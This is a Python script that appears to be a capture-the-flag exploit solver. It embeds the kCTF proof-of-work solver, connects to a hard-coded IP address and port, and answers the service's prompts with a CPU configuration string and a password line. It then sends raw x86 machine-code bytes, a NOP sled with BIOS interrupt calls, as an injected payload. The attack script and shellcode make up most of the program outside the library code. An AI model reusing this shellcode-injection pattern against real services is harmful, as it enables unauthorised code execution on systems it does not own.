import socket
import os
import signal
import subprocess

import base64
import os
import secrets
import socket
import sys
import hashlib

try:
	import gmpy2
	HAVE_GMP = True
except ImportError:
	HAVE_GMP = False
	sys.stderr.write("[NOTICE] Running 10x slower, gotta go fast? pip3 install gmpy2\n")

VERSION = 's'
MODULUS = 2**1279-1
CHALSIZE = 2**128

SOLVER_URL = 'https://goo.gle/kctf-pow'

def python_sloth_root(x, diff, p):
	exponent = (p + 1) // 4
	for i in range(diff):
		x = pow(x, exponent, p) ^ 1
	return x

def python_sloth_square(y, diff, p):
	for i in range(diff):
		y = pow(y ^ 1, 2, p)
	return y

def gmpy_sloth_root(x, diff, p):
	exponent = (p + 1) // 4
	for i in range(diff):
		x = gmpy2.powmod(x, exponent, p).bit_flip(0)
	return int(x)

def gmpy_sloth_square(y, diff, p):
	y = gmpy2.mpz(y)
	for i in range(diff):
		y = gmpy2.powmod(y.bit_flip(0), 2, p)
	return int(y)

def sloth_root(x, diff, p):
	if HAVE_GMP:
		return gmpy_sloth_root(x, diff, p)
	else:
		return python_sloth_root(x, diff, p)

def sloth_square(x, diff, p):
	if HAVE_GMP:
		return gmpy_sloth_square(x, diff, p)
	else:
		return python_sloth_square(x, diff, p)

def encode_number(num):
	size = (num.bit_length() // 24) * 3 + 3
	return str(base64.b64encode(num.to_bytes(size, 'big')), 'utf-8')

def decode_number(enc):
	return int.from_bytes(base64.b64decode(bytes(enc, 'utf-8')), 'big')

def decode_challenge(enc):
	dec = enc.split('.')
	if dec[0] != VERSION:
		raise Exception('Unknown challenge version')
	return list(map(decode_number, dec[1:]))

def encode_challenge(arr):
	return '.'.join([VERSION] + list(map(encode_number, arr)))

def get_challenge(diff):
	x = secrets.randbelow(CHALSIZE)
	return encode_challenge([diff, x])

def solve_challenge(chal):
	[diff, x] = decode_challenge(chal)
	y = sloth_root(x, diff, MODULUS)
	return encode_challenge([y])

def verify_challenge(chal, sol):
	[diff, x] = decode_challenge(chal)
	[y] = decode_challenge(sol)
	res = sloth_square(y, diff, MODULUS)
	return (x == res) or (MODULUS - x == res)

def usage():
	sys.stdout.write('Usage:\n')
	sys.stdout.write('Solve pow: {} solve $challenge\n')
	sys.stdout.write('Check pow: {} ask $difficulty\n')
	sys.stdout.write('	$difficulty examples (for 1.6GHz CPU) in fast mode:\n')
	sys.stdout.write('			   1337:   1 sec\n')
	sys.stdout.write('			   31337:  30 secs\n')
	sys.stdout.write('			   313373: 5 mins\n')
	sys.stdout.flush()


HOST = '46.30.202.223'
PORT = 4993
donnees=b""
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.settimeout(20)
client.connect((HOST, PORT))
while(b"===================" not in donnees):
	donnees += client.recv(1024)

print(donnees.decode("utf-8"),end="")

challenge = donnees.decode("utf-8").splitlines()[-4].split(" ")[-1]
print(challenge)
solution = solve_challenge(challenge)
solution+="\n"
print(solution)
message=solution.encode("utf-8")
n = client.send(message)
donnees = b""
donnees +=client.recv(1024)
print(donnees.decode("utf-8"), end="")
message="O\n".encode("utf-8")
n = client.send(message)
donnees = b""
donnees +=client.recv(1024)
print(donnees.decode("utf-8"), end="")
message="Penryn,vendor=BARBOUILLEUR,-sse3,-ssse3,-pclmulqdq,popcnt,aes,-apic,-mtrr\n".encode("utf-8")
n = client.send(message)
donnees = b""
while(b"> " not in donnees):
	donnees += client.recv(1024)
print(donnees.decode("utf-8"), end="")
message = b"Vous savez, moi je ne crois pas qu'il y ait de bon ou de mauvais mot de passe.\n"
n = client.send(message)
donnees=b""

if (n!=len(message)):
	print("send failed.")
print("message sent")
while(b"> " not in donnees):
	donnees += client.recv(1024)
print(donnees.decode("utf-8"), end="")
client.send(b"\x68\x37\x13\x00\x00\x5f\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcd\x10\x90\xcd\x16\n")
print("Donnees guidage envoyées")
donnees=b""
while(b"Interruption" not in donnees):
	print(donnees.decode("ascii","ignore"), end="")
	donnees += client.recv(1024)
print(donnees.decode("ascii","ignore"), end="")
print("end")

client.close()
